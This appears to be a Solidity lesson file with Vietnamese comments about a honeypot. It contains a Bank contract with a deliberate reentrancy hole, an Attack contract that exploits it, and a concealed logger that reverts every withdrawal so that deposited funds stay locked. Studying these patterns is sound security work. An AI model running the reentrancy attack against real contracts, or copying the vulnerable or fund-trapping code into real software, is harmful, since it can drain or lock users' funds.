// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// # Bảo mật Sol / Honeypot

// Honeypot là trap để catch hacker lừa cho nó tưởng rằng contract này vulnerable
contract Bank {
    mapping(address => uint) public balances;
    Logger public logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    // Lừa hacker rằng hàm này bị dính reentrancy nhưng thật ra là trap vì hàm log bị hide kp là contract logger mà là contract khác ở file khác k publish
    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        // balances[msg.sender] -= _amount;
        // Làm -= _amount thì cx cản được reentrancy. VD trong contract có 2 ether mà thg này nạp vào 1 ether-> xong nó rút thì gọi đệ quy 3 lần để lấy hết 3 ether trong contract. Sau khi đệ quy xong nó vẫn chạy tiếp bên dưới bth thì thấy balances[msg.sender] -= _amount 3 lần thành thành số âm mà trong solidity phiên bản 8 có check lỗi underflow tức là sai và contract bị revert. 
        // => Tức nó rút quá thì cx bị revert => đm đây chính là cách cản reentrancy mà update balances ở sau hàm call
        balances[msg.sender] = 0;

        logger.log(msg.sender, _amount, "Withdraw");
    }
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
contract Logger {
    event Log(address caller, uint amount, string action);

    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        emit Log(_caller, _amount, _action);
    }
}
// Hacker tries to drain the Ethers stored in Bank by reentrancy.
contract Attack {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Let's say this code is in a separate file so that others cannot read it.
contract HoneyPot {
    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        // Để so sánh strings trong solidity thì tốt nhất là hash nó và so sánh như dưới
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    // Function to compare strings using keccak256
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}
// Cơ chế: hacker tưởng là log là của hàm log nên dùng reentrancy để rút hết toàn bộ tiền trong contract nhưng thực chất về sau bị revert và nhìn log sẽ báo được address của hacker
// Ở Th này k ai có thể withdraw được 